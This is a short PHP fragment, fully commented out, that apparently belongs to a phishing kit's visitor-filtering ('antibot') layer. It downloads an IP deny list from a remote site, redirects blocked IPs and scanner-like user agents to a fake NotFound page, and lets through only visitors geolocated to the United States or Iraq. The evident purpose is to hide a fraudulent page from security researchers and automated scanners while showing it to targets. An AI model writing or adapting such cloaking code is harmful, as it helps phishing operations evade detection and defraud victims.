<?php
/*
##################### SECOND FILES ##################### 
include('../../functions/get_ip.php');
################## ACCOUNT INFORMATION #################

// ================== 26/9/2019 =================================
// ================== 30/9/2019 ================================
$url = "https://fanztek.com/listip.txt";
$ART = file_get_contents($url);
//===============================================================
$deny = explode("\n", $ART);
$deny = array_map('trim', $deny);
if (in_array ($_SESSION['_ip_'], $deny)) {header("location: ../../../../../../NotFound");fclose($deny);}
if ($_SERVER['HTTP_USER_AGENT'] == 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)' or $_SERVER['HTTP_USER_AGENT'] == 'Mozilla/5.0') {
    header("location: ../../../../../../NotFound");
}


if ($_SESSION['_LOOKUP_COUNTRY_'] == 'United States' OR  $_SESSION['_LOOKUP_COUNTRY_'] == 'Iraq'){

}else{header("location: ../../../../../../NotFound");}

*/

?>